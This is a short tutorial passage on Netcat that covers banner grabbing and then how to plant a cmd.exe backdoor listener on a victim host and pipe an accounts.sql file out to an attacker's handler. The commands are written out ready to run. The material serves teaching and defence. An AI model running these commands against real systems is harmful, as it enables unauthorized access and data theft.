NETCAT

One simple but effective tool for testing connectivity is **Netcat** (`nc`), available for both Windows and Linux. Netcat can be used for port scanning and fingerprinting. For example, the following command attempts to connect to the HTTP port on a server and return any banner by sending the "head" HTTP keyword:

`echo "head" | nc 10.1.0.1 -v 80`

Netcat can also establish connections with remote machines. To configure Netcat as a backdoor, you first set up a listener on the victim system (IP: 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler:

`nc -l -p 666 -e cmd.exe`

The following command connects to the listener and grants access to the terminal:

`nc 10.1.0.1 666`

Used the other way around, Netcat can be used to receive files. For example, on the target system the attacker runs the following:

`type accounts.sql | nc 10.1.0.192 6666`

On the handler (IP 10.1.0.192), the attacker receives the file using the following command:

`nc -l -p 6666 > accounts.sql`
